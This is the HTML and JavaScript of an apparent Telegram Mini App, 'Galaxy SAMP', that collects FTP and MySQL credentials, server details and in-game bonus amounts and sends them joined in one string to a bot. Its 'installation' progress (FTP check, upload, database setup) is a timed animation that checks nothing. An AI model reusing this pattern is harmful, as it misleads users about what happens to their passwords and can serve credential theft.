<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🪐 Galaxy Server Manager</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto:wght@300;400;500;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        :root {
            --primary: #00ff88;
            --secondary: #00d4ff;
            --accent: #ff00ff;
            --bg-dark: #0a0a1a;
            --bg-card: rgba(255, 255, 255, 0.05);
            --text-main: #ffffff;
            --text-dim: #8888aa;
            --border: rgba(255, 255, 255, 0.1);
            --danger: #ff4444;
            --warning: #ffaa00;
        }
        
        body {
            font-family: 'Roboto', sans-serif;
            background: 
                radial-gradient(ellipse at 20% 50%, rgba(0, 255, 136, 0.08) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 50%, rgba(0, 212, 255, 0.08) 0%, transparent 50%),
                var(--bg-dark);
            min-height: 100vh;
            color: var(--text-main);
            overflow-x: hidden;
            position: relative;
        }
        
        /* Звезды */
        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }
        
        .star {
            position: absolute;
            width: 2px;
            height: 2px;
            background: white;
            border-radius: 50%;
            animation: twinkle 3s infinite;
        }
        
        @keyframes twinkle {
            0%, 100% { opacity: 0; transform: scale(0.5); }
            50% { opacity: 1; transform: scale(1.2); }
        }
        
        /* Планеты */
        .planet {
            position: fixed;
            border-radius: 50%;
            pointer-events: none;
            z-index: 1;
            animation: floatPlanet 6s ease-in-out infinite;
        }
        
        .planet-1 {
            width: 80px;
            height: 80px;
            top: 10%;
            right: -20px;
            background: radial-gradient(circle at 30% 30%, #ff6b6b, #c0392b, #2c3e50);
            box-shadow: 0 0 40px rgba(255, 107, 107, 0.3);
            animation-delay: 0s;
        }
        
        .planet-2 {
            width: 50px;
            height: 50px;
            top: 70%;
            left: -15px;
            background: radial-gradient(circle at 30% 30%, #74b9ff, #0984e3, #2c3e50);
            box-shadow: 0 0 30px rgba(116, 185, 255, 0.3);
            animation-delay: 2s;
        }
        
        .planet-3 {
            width: 40px;
            height: 40px;
            top: 40%;
            right: 10%;
            background: radial-gradient(circle at 30% 30%, #a29bfe, #6c5ce7, #2c3e50);
            box-shadow: 0 0 25px rgba(162, 155, 254, 0.3);
            animation-delay: 4s;
        }
        
        @keyframes floatPlanet {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            25% { transform: translateY(-20px) rotate(5deg); }
            50% { transform: translateY(0) rotate(0deg); }
            75% { transform: translateY(20px) rotate(-5deg); }
        }
        
        /* Спутник */
        .satellite {
            position: fixed;
            top: 20%;
            left: 10%;
            width: 12px;
            height: 12px;
            background: var(--secondary);
            border-radius: 50%;
            box-shadow: 0 0 20px var(--secondary);
            pointer-events: none;
            z-index: 1;
            animation: orbitSatellite 8s linear infinite;
        }
        
        @keyframes orbitSatellite {
            0% { transform: translate(0, 0); opacity: 1; }
            25% { transform: translate(100px, 50px); opacity: 0.8; }
            50% { transform: translate(200px, 0); opacity: 1; }
            75% { transform: translate(100px, -50px); opacity: 0.8; }
            100% { transform: translate(0, 0); opacity: 1; }
        }
        
        .container {
            position: relative;
            z-index: 2;
            padding: 20px;
            max-width: 500px;
            margin: 0 auto;
        }
        
        /* Заголовок */
        .header {
            text-align: center;
            padding: 30px 20px;
            margin-bottom: 25px;
            background: linear-gradient(135deg, rgba(0, 255, 136, 0.1), rgba(0, 212, 255, 0.1), rgba(255, 0, 255, 0.1));
            border-radius: 24px;
            border: 1px solid var(--border);
            backdrop-filter: blur(10px);
            animation: fadeInDown 0.8s ease;
        }
        
        @keyframes fadeInDown {
            from { opacity: 0; transform: translateY(-30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .header-logo {
            font-family: 'Orbitron', sans-serif;
            font-size: 30px;
            font-weight: 900;
            background: linear-gradient(135deg, var(--primary), var(--secondary), var(--accent));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
            animation: logoGlow 3s ease-in-out infinite;
        }
        
        @keyframes logoGlow {
            0%, 100% { filter: drop-shadow(0 0 10px rgba(0, 255, 136, 0.3)); }
            50% { filter: drop-shadow(0 0 30px rgba(0, 255, 136, 0.6)); }
        }
        
        .header-subtitle {
            font-size: 13px;
            color: var(--text-dim);
            letter-spacing: 2px;
            text-transform: uppercase;
        }
        
        /* Карточки */
        .card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 15px;
            backdrop-filter: blur(10px);
            animation: fadeInUp 0.5s ease;
            transition: all 0.3s ease;
        }
        
        .card:hover {
            border-color: rgba(0, 255, 136, 0.3);
            box-shadow: 0 5px 30px rgba(0, 255, 136, 0.1);
        }
        
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .card-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 18px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .card-title-icon {
            width: 38px;
            height: 38px;
            border-radius: 10px;
            background: linear-gradient(135deg, rgba(0, 255, 136, 0.2), rgba(0, 212, 255, 0.2));
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            animation: iconPulse 2s ease-in-out infinite;
        }
        
        @keyframes iconPulse {
            0%, 100% { box-shadow: 0 0 10px rgba(0, 255, 136, 0.2); }
            50% { box-shadow: 0 0 25px rgba(0, 255, 136, 0.4); }
        }
        
        /* Форма */
        .form-group { margin-bottom: 15px; }
        
        .form-label {
            display: block;
            font-size: 13px;
            color: var(--text-dim);
            margin-bottom: 8px;
            font-weight: 500;
            letter-spacing: 0.5px;
        }
        
        .form-input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(0, 0, 0, 0.3);
            border: 2px solid var(--border);
            border-radius: 12px;
            color: white;
            font-size: 15px;
            transition: all 0.3s ease;
            font-family: 'Roboto', sans-serif;
        }
        
        .form-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.15);
            background: rgba(0, 255, 136, 0.05);
        }
        
        .form-input::placeholder {
            color: #555577;
        }
        
        /* Кнопки */
        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Roboto', sans-serif;
            letter-spacing: 0.5px;
        }
        
        .btn:active { transform: scale(0.97); }
        
        .btn-primary {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: var(--bg-dark);
            box-shadow: 0 5px 25px rgba(0, 255, 136, 0.3);
            animation: btnGlow 3s ease-in-out infinite;
        }
        
        @keyframes btnGlow {
            0%, 100% { box-shadow: 0 5px 25px rgba(0, 255, 136, 0.3); }
            50% { box-shadow: 0 5px 40px rgba(0, 255, 136, 0.5); }
        }
        
        /* Модальное окно */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 2000;
            backdrop-filter: blur(20px);
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .modal-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(135deg, #1a1a2e, #0a0a1a);
            padding: 30px;
            border-radius: 24px;
            border: 2px solid var(--primary);
            box-shadow: 0 0 60px rgba(0, 255, 136, 0.2);
            width: 90%;
            max-width: 400px;
            animation: modalIn 0.3s ease;
        }
        
        @keyframes modalIn {
            from { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
            to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
        }
        
        /* Лоадер */
        .loader {
            width: 60px;
            height: 60px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-top: 3px solid var(--primary);
            border-right: 3px solid var(--secondary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Прогресс */
        .progress-bar {
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            overflow: hidden;
            margin: 15px 0;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--accent));
            border-radius: 4px;
            transition: width 0.5s ease;
            width: 0%;
            position: relative;
        }
        
        .progress-fill::after {
            content: '';
            position: absolute;
            top: 0;
            left: -50%;
            width: 50%;
            height: 100%;
            background: rgba(255, 255, 255, 0.3);
            animation: shimmer 2s infinite;
        }
        
        @keyframes shimmer {
            0% { transform: translateX(0); }
            100% { transform: translateX(300%); }
        }
        
        /* Шаги */
        .steps {
            display: grid;
            gap: 12px;
            margin: 20px 0;
        }
        
        .step {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.03);
            transition: all 0.3s ease;
            font-size: 14px;
        }
        
        .step-icon {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            background: rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
        }
        
        .step.active {
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid rgba(0, 255, 136, 0.3);
        }
        
        .step.active .step-icon {
            background: var(--primary);
            color: var(--bg-dark);
        }
        
        .step.done .step-icon {
            background: var(--primary);
            color: var(--bg-dark);
        }
        
        /* Toast */
        .toast {
            position: fixed;
            top: 20px;
            left: 20px;
            right: 20px;
            background: linear-gradient(135deg, rgba(0, 255, 136, 0.95), rgba(0, 212, 255, 0.95));
            color: var(--bg-dark);
            padding: 15px 20px;
            border-radius: 12px;
            z-index: 3000;
            font-weight: 600;
            animation: slideDown 0.5s ease;
            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.3);
            text-align: center;
        }
        
        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <!-- Звезды -->
    <div class="stars">
        <div class="star" style="top: 5%; left: 10%; animation-delay: 0s;"></div>
        <div class="star" style="top: 15%; left: 25%; animation-delay: 0.3s;"></div>
        <div class="star" style="top: 8%; left: 45%; animation-delay: 0.6s;"></div>
        <div class="star" style="top: 20%; left: 65%; animation-delay: 0.9s;"></div>
        <div class="star" style="top: 12%; left: 85%; animation-delay: 1.2s;"></div>
        <div class="star" style="top: 35%; left: 15%; animation-delay: 1.5s;"></div>
        <div class="star" style="top: 45%; left: 75%; animation-delay: 1.8s;"></div>
        <div class="star" style="top: 55%; left: 35%; animation-delay: 2.1s;"></div>
        <div class="star" style="top: 65%; left: 55%; animation-delay: 2.4s;"></div>
        <div class="star" style="top: 75%; left: 25%; animation-delay: 2.7s;"></div>
        <div class="star" style="top: 85%; left: 70%; animation-delay: 3s;"></div>
        <div class="star" style="top: 30%; left: 90%; animation-delay: 3.3s;"></div>
        <div class="star" style="top: 50%; left: 5%; animation-delay: 3.6s;"></div>
        <div class="star" style="top: 90%; left: 45%; animation-delay: 3.9s;"></div>
    </div>
    
    <!-- Планеты -->
    <div class="planet planet-1"></div>
    <div class="planet planet-2"></div>
    <div class="planet planet-3"></div>
    
    <!-- Спутник -->
    <div class="satellite"></div>
    
    <div class="container">
        <!-- Заголовок -->
        <div class="header">
            <div class="header-logo">🪐 GALAXY SAMP</div>
            <div class="header-subtitle">Управление серверами</div>
        </div>
        
        <!-- Форма -->
        <div class="card">
            <div class="card-title">
                <div class="card-title-icon">📁</div>
                <span>FTP Данные</span>
            </div>
            
            <div class="form-group">
                <label class="form-label">FTP IP / Домен</label>
                <input type="text" id="ftp-ip" class="form-input" placeholder="ftp.hostgta.net">
            </div>
            
            <div class="form-group">
                <label class="form-label">FTP Логин</label>
                <input type="text" id="ftp-login" class="form-input" placeholder="u1234_user">
            </div>
            
            <div class="form-group">
                <label class="form-label">FTP Пароль</label>
                <input type="password" id="ftp-password" class="form-input" placeholder="••••••••">
            </div>
        </div>
        
        <div class="card">
            <div class="card-title">
                <div class="card-title-icon">🌐</div>
                <span>Сервер</span>
            </div>
            
            <div class="form-group">
                <label class="form-label">Название сервера</label>
                <input type="text" id="server-name" class="form-input" placeholder="My SAMP Server">
            </div>
            
            <div class="form-group">
                <label class="form-label">IP Сервера</label>
                <input type="text" id="server-ip" class="form-input" placeholder="5.39.108.49:7777">
            </div>
        </div>
        
        <div class="card">
            <div class="card-title">
                <div class="card-title-icon">🎁</div>
                <span>Бонусы</span>
            </div>
            
            <div class="form-group">
                <label class="form-label">Деньги и Донат</label>
                <input type="text" id="bonuses" class="form-input" placeholder="5000000 1000">
            </div>
        </div>
        
        <div class="card">
            <div class="card-title">
                <div class="card-title-icon">🗄️</div>
                <span>MySQL</span>
            </div>
            
            <div class="form-group">
                <label class="form-label">Логин, Пароль, База</label>
                <input type="text" id="mysql" class="form-input" placeholder="u1234_user pass123 u1234_base">
            </div>
        </div>
        
        <!-- Кнопка -->
        <button class="btn btn-primary" onclick="startInstallation()" style="margin-bottom: 30px;">
            🚀 Запустить установку
        </button>
    </div>
    
    <!-- Модальное окно -->
    <div id="loading-modal" class="modal">
        <div class="modal-content">
            <div style="text-align: center;">
                <div class="loader"></div>
                <h3 style="font-family: 'Orbitron', sans-serif; font-size: 18px; margin-bottom: 5px;">Установка...</h3>
                <p style="font-size: 13px; color: var(--text-dim);" id="loading-status">Подготовка</p>
            </div>
            
            <div class="progress-bar">
                <div id="progress-fill" class="progress-fill"></div>
            </div>
            
            <div class="steps">
                <div class="step" id="step1">
                    <div class="step-icon" id="step1-icon">1</div>
                    <span>Отправка данных в бота</span>
                </div>
                <div class="step" id="step2">
                    <div class="step-icon" id="step2-icon">2</div>
                    <span>Проверка FTP подключения</span>
                </div>
                <div class="step" id="step3">
                    <div class="step-icon" id="step3-icon">3</div>
                    <span>Загрузка файлов на сервер</span>
                </div>
                <div class="step" id="step4">
                    <div class="step-icon" id="step4-icon">4</div>
                    <span>Настройка базы данных</span>
                </div>
                <div class="step" id="step5">
                    <div class="step-icon" id="step5-icon">5</div>
                    <span>Завершение установки</span>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        tg.setHeaderColor('#0a0a1a');
        tg.setBackgroundColor('#0a0a1a');
        
        function showToast(message) {
            let toast = document.createElement('div');
            toast.className = 'toast';
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => {
                toast.style.opacity = '0';
                toast.style.transition = 'opacity 0.5s';
                setTimeout(() => toast.remove(), 500);
            }, 3000);
        }
        
        function startInstallation() {
            let ftpIp = document.getElementById('ftp-ip').value.trim();
            let ftpLogin = document.getElementById('ftp-login').value.trim();
            let ftpPassword = document.getElementById('ftp-password').value.trim();
            let serverName = document.getElementById('server-name').value.trim();
            let serverIp = document.getElementById('server-ip').value.trim();
            let bonuses = document.getElementById('bonuses').value.trim();
            let mysql = document.getElementById('mysql').value.trim();
            
            if (!ftpIp || !ftpLogin || !ftpPassword) {
                showToast('⚠️ Заполните FTP данные!');
                return;
            }
            
            if (!serverName) {
                showToast('⚠️ Введите название сервера!');
                return;
            }
            
            if (!serverIp) {
                showToast('⚠️ Введите IP сервера!');
                return;
            }
            
            if (!bonuses) bonuses = "0 0";
            
            if (!mysql) {
                showToast('⚠️ Заполните MySQL данные!');
                return;
            }
            
            let data = [ftpIp, ftpLogin, ftpPassword, serverName, serverIp, bonuses, mysql].join("|");
            
            document.getElementById('loading-modal').style.display = 'block';
            
            let steps = [
                { id: 1, progress: 10, text: 'Отправка данных...', delay: 0 },
                { id: 2, progress: 30, text: 'Проверка FTP...', delay: 500 },
                { id: 3, progress: 60, text: 'Загрузка файлов...', delay: 1000 },
                { id: 4, progress: 80, text: 'Настройка БД...', delay: 1500 },
                { id: 5, progress: 100, text: 'Завершение...', delay: 2000 }
            ];
            
            steps.forEach(step => {
                setTimeout(() => {
                    document.getElementById('progress-fill').style.width = step.progress + '%';
                    document.getElementById('loading-status').textContent = step.text;
                    
                    for (let i = 1; i <= 5; i++) {
                        let stepEl = document.getElementById('step' + i);
                        let iconEl = document.getElementById('step' + i + '-icon');
                        
                        if (i < step.id) {
                            stepEl.classList.add('done');
                            stepEl.classList.remove('active');
                            iconEl.textContent = '✅';
                        } else if (i === step.id) {
                            stepEl.classList.add('active');
                            stepEl.classList.remove('done');
                            iconEl.textContent = '⏳';
                        }
                    }
                }, step.delay);
            });
            
            setTimeout(() => {
                tg.sendData(data);
                setTimeout(() => {
                    document.getElementById('loading-modal').style.display = 'none';
                    tg.close();
                }, 2000);
            }, 2500);
        }
    </script>
</body>
</html>
